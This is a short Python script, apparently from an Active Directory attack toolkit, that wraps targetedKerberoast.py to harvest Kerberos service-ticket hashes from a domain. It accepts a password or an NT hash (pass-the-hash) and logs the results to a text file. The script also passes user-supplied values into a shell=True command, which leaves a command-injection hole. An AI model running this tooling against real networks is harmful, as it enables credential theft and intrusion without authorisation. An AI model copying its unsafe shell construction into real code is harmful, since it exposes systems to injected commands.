import os
import subprocess
from argument_parser import parse_arguments  # Import the parse_arguments function

# Set colorama color constants
try:
    from colorama import Fore
except ImportError:
    os.system("sudo pip install colorama")

RED = Fore.RED
YELLOW = Fore.YELLOW
GREEN = Fore.GREEN
MAGENTA = Fore.MAGENTA
BLUE = Fore.BLUE
CYAN = Fore.CYAN
RESET = Fore.RESET

def Targ():
    args = parse_arguments()  # Parse arguments
    DOMAIN = args.DomainName
    USER = args.Username
    PASS = args.Password
    subprocess.call([f"targetedKerberoast.py -v -d {DOMAIN} -u {USER} -p {PASS} | tee -a TargetedKerberoast.txt"], shell=True)
    print(f"{YELLOW}Saved to TargetedKerberoast.txt{RESET}")
    with open("TargetedKerberoast.txt", "r") as f:
        content = f.read()
        print(content)

def HTarg():
    args = parse_arguments()  # Parse arguments
    DOMAIN = args.DomainName
    USER = args.Username
    PASS = args.Password
    subprocess.call([f"targetedKerberoast.py -v -d {DOMAIN} -u {USER} -H 00000000000000000000000000000000:{PASS} | tee -a TargetedKerberoast.txt"], shell=True)
    print(f"{YELLOW}Saved to TargetedKerberoast.txt{RESET}")
    with open("TargetedKerberoast.txt", "r") as f:
        content = f.read()
        print(content)

def main():
    Targ()  # You can now call Targ without passing arguments

if __name__ == '__main__':
    main()